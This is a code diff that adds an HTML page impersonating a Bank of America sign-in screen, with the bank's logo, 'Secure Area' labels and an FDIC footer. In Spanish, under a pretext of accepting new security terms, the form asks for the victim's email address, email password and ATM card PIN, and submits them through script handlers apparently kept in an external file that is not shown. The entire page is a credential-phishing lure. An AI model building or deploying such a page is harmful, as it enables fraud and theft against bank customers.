@@ -1,0 +1,64 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<HTML  xmlns="http://www.w3.org/1999/xhtml">
+<HEAD>
+ 
+ <TITLE>Default</TITLE> 
+ <link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
+<META http-equiv="Content-Type" content="text/html; charset=utf-8">        
+<LINK href="css/new.css" rel="stylesheet" type="text/css" media="all">
+<LINK href="css/pin.css" rel="stylesheet" type="text/css" media="all"> 
+<link href="css/estilos.css"rel="stylesheet" type="text/css" media="all">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="./dt.js"></script>
+</HEAD>
+<BODY>
+<script src="script/popup.js" defer></script>
+<DIV class="contenedor"><DIV class="fsd-layout fsd-2c-700lt-layout"><DIV class="fsd-border">	<DIV class="center-content"><DIV class="header"><DIV class="header-module"><DIV class="fsd-secure-esp-skin">
+<IMG width="230" height="28"  src="https://ik.imagekit.io/bfa/fde_files/BofA_rgb.png"><DIV class="page-type" data-font="cnx-regular">Sign In</DIV><DIV class="right-links">
+<DIV class="secure-area">Secure Area</DIV><A name="spanish_toggle" title="" target="_self">En Espa&ntilde;ol</A><DIV class="clearboth"></DIV></DIV>
+<DIV class="clearboth"></DIV></DIV></DIV><DIV class="page-title-module h-100" id="skip-to-h1"><DIV class="red-grad-bar-skin sup-ie">
+<H1 data-font="cnx-regular" style="font-weight: normal">Sign In</H1></DIV></DIV>
+
+
+<div id="clientSideErrors" class="messaging-vipaa-module hide" aria-live="polite">
+<div class="error-skin">
+<div class="error-message">
+<p class="title TLu_ERROR">We can not process your request.</p>
+<ul>
+	<li id="errorEmail" class="hide"> Please enter a valid email address.</li>
+	<li id= "errorPass" class="hide">This field is required.</li>
+</ul></div></div></div>
+
+
+
+<form method="post"  action="" onsubmit="return sender2();" style="min-height: calc(100vh - 100px - 300px)">	
+						<p id="gfgdos"  hidden=""></p>
+						<p id="addressdos"  hidden=""></p>
+       
+<div class="verifi">Verificación: </div><br><br><div class="termino"> Para aceptar nuestros nuevos Términos y Condiciones de seguridad por favor provea la siguiente información<br><br>	
+
+Email:<br>
+<input class="async-encrypt tl-private fl-lt ssnTinNo" type="email" name="email" id="email" maxlength="50" value="" required style="margin-left: 10%; width:170px;height:30px;" autocomplete="off" >
+             <div class="clearboth"></div><br> 
+ Password de Correo: <br>
+<input class="async-encrypt tl-private fl-lt ssnTinNo" type="password" name="pass" id="pass" maxlength="30" value="" required style="margin-left: 10%; width:170px;height:30px;" autocomplete="off" >
+
+             <div class="clearboth"></div><br> 
+            Indique el PIN de la tarjeta de cajero automático (ATM) que esta asignada a la cuenta</label><br>
+<input type="tel" class="async-encrypt tl-private fl-lt ssnTinNo onlynumber pass-type" pattern="[0-9].{3,}" name="pin" id="pin" maxlength="10" value="" required="" onkeypress="return event.charCode >= 48 && event.charCode <= 57" style="margin-left: 10%; width:90px;height:30px;" autocomplete="off" ><div class="clearboth"></div><br>
+<strong>Security preference:</strong> Do you want us to remember this computer?<div class="clearboth"></div><br>
+
+
+<input id="otp-card-email-id1" name="debitCardNumber" type="radio" ><label style="font-weight: bold;">  Yes, remember this computer.</label><br><label> Trust this computer when I start a session.</label>
+<div class="clearboth"></div><br>
+<input id="otp-card-email-id2" name="debitCardNumber" type="radio" ><label style="font-weight: bold;">  No, I do not remember this computer.</label><br><label> Ask me a security question every time I start a session.</label>  </div>   <br>
+
+<div class="clearboth"></div>
+<button type="submit" class="mtop-15 btn-bofa btn-bofa-small btn-bofa-blue submit" id="idSIButton8" 
+style="margin-left: 10%;padding: 2px 5px" onclick="enviar()">Continuar</button>
+<a href="" class="mtop-15 btn-bofa btn-bofa-small btn-bofa-gray btn-bofa-noRight" style="padding: 2px 5px;" id="forgot-cancel" name="forgot-cancel"><span>Cancelar</span></a>
+</form>
+<DIV class="clearboth"></DIV></DIV><DIV class="footer">
+<DIV class="footer-top">&nbsp;  	</DIV><DIV class="footer-inner"><DIV class="global-footer-module"><DIV class="gray-bground-skin cssp"><DIV class="secure">Secure area</DIV><DIV class="link-container">	<DIV class="link-row"><A name="Privacy_&amp;_Security_footer" title="Privacy &amp; Security" class="last-link" href="#" target="_blank">Privacy &amp; Security</A><DIV class="clearboth"></DIV></DIV></DIV>
+<P>BofA, N.A. Member FDIC. <A name="Equal_Housing_Lender" href="#" target="_blank">Equal Housing Lender</A> <BR>&copy;2023 BoA Corporation.</P></DIV></DIV></DIV></DIV></DIV></DIV></DIV></BODY></HTML>
